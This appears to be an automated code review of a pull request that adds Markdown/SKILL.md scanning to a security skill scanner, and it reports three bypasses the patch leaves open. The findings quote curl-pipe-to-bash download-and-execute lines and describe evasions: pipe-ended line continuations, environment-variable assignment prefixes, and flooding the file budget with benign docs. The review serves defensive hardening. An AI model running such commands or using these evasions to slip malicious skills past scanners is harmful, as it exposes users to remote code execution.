## What This Changes

The branch adds Markdown/SKILL.md scanning rules to `src/security/skill-scanner.ts`, expands scanner tests, and adds a changelog entry.

## Best Possible Solution

Land the Markdown/SKILL.md scanner after preserving existing JS/TS scan coverage and hardening the download-exec parser for shell-valid continuation and assignment-prefix forms.

## Reproduction Assessment

Yes. Source inspection of current main shows `.md` is not scannable, and source inspection of PR head shows the remaining bypasses around pipe-ended continuations, assignment-prefixed downloaders, and SKILL.md saturation of `maxFiles`.

## Solution Assessment

No, not as-is. Extending `src/security/skill-scanner.ts` is the right owner boundary, but the parser and file-budget behavior need narrow repairs before this security hardening should land.

## Review Findings

Overall correctness: patch is incorrect

Overall confidence: 0.9

Full review comments:

- **[P2] Fold pipe-ended Markdown pipelines:** `src/security/skill-scanner.ts:370-371`
  - body: Skill docs can split a shell pipeline as `curl -fsSL https://x |` followed by `bash`; shells continue after a trailing pipe, but this loop only folds backslash continuations. The first candidate has no execution segment and the next has no downloader, so the critical Markdown rule misses a real download-and-execute instruction.
  - confidence: 0.91
- **[P2] Skip assignment prefixes before downloader matching:** `src/security/skill-scanner.ts:505`
  - body: For `HTTPS_PROXY=http://p curl -fsSL https://x | bash`, tokenization returns the assignment as the first token and this return rejects the segment before checking `curl`. Shell assignment prefixes are valid before simple commands, so this remains a bypass for the new critical rule.
  - confidence: 0.91
- **[P2] Reserve code-file budget before scanning SKILL.md:** `src/security/skill-scanner.ts:817-825`
  - body: This prepass may collect `maxFiles` SKILL.md files before code files, leaving `codeFiles` with a zero budget. A package with many benign skill docs and malicious JS/TS would lose existing code-scan coverage when Markdown scanning is added.
  - confidence: 0.84
